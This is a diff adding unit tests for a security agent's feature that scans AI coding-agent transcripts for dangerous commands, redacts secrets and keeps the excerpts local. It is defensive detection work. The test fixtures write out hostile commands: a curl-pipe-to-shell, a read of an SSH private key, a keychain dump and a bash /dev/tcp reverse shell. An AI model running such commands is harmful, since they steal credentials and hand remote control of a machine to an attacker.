@@ -478,5 +478,71 @@ class LolaiAdvisory(unittest.TestCase):
         self.assertEqual(len(rows), 1)
 
 
+class Phase5Audit(unittest.TestCase):
+    """Phase 5 — opt-in, local-only AI audit-log intelligence. Parses transcripts for executed dangerous
+    commands; summary() (-> Mesh) is counts-only, detail() (local) carries sanitised excerpts, and a
+    disabled collector leaks nothing."""
+
+    def test_sanitizer_scrubs_secrets_keeps_shape(self):
+        s = agent._ai_audit_sanitize(
+            "export ANTHROPIC_API_KEY=sk-ant-abc123deadbeef99 && curl http://x | sh", home="/Users/bob")
+        self.assertNotIn("sk-ant-abc123deadbeef99", s)
+        self.assertIn("<redacted>", s)
+        self.assertIn("curl", s)
+        self.assertIn("| sh", s)
+
+    def test_sanitizer_collapses_home(self):
+        s = agent._ai_audit_sanitize("cat /Users/bob/.ssh/id_rsa", home="/Users/bob")
+        self.assertIn("~/.ssh/id_rsa", s)
+        self.assertNotIn("/Users/bob", s)
+
+    def test_command_extraction_from_tool_use(self):
+        obj = {"type": "assistant", "message": {"content": [
+            {"type": "tool_use", "name": "Bash", "input": {"command": "security dump-keychain -d"}}]}}
+        cmds = list(agent._ai_audit_commands(obj))
+        self.assertEqual(cmds, ["security dump-keychain -d"])   # once, not doubled
+
+    def _run_collector(self, lines):
+        tmp = tempfile.mkdtemp()
+        proj = os.path.join(tmp, ".claude", "projects", "p1")
+        os.makedirs(proj)
+        with open(os.path.join(proj, "sess.jsonl"), "w", encoding="utf-8") as fh:
+            for obj in lines:
+                fh.write(json.dumps(obj) + "\n")
+        c = agent.AIAuditCollector(enabled=True)
+        c._homes = lambda: [tmp]
+        c._collect()
+        return c
+
+    def test_summary_counts_only_detail_has_excerpts(self):
+        # the reverse-shell pattern is in both the macOS and Linux SHELL_RULES, so this is OS-agnostic;
+        # the benign command must not match.
+        c = self._run_collector([
+            {"input": {"command": "ls -la"}},                                   # benign
+            {"input": {"command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}},   # reverse shell
+        ])
+        s, d = c.summary(), c.detail()
+        self.assertEqual(s["by_category"], {"reverse-shell pattern": 1})
+        self.assertEqual(d["counts"]["total"], 1)           # the benign line produced nothing
+        sj = json.dumps(s)
+        for leak in ("dev/tcp", "4444", "excerpt", "\"transcript\":", ".jsonl"):
+            self.assertNotIn(leak, sj)                      # summary -> Mesh carries no content
+        self.assertTrue(any("/dev/tcp" in f["excerpt"] for f in d["findings"]))
+        self.assertTrue(all(f["transcript"].startswith("~") for f in d["findings"]))
+
+    def test_disabled_collector_leaks_nothing(self):
+        c = agent.AIAuditCollector(enabled=False)
+        self.assertEqual(c.summary(), {"enabled": False})
+        self.assertEqual(c.detail()["enabled"], False)
+
+    def test_api_ai_audit_not_relay_whitelisted(self):
+        # the Mesh relay can only fetch VIEW_WHITELIST endpoints; the audit EXCERPTS must never be in it,
+        # while the counts-only summary IS shared so the fleet can tally categories.
+        wl = agent.MeshReporter.VIEW_WHITELIST
+        self.assertNotIn("/api/ai-audit", wl)            # excerpts stay local
+        self.assertIn("/api/ai-audit-summary", wl)       # counts reach the Mesh
+        self.assertIn("/api/ai-surface", wl)             # sanity: surface IS shared
+
+
 if __name__ == "__main__":
     unittest.main()
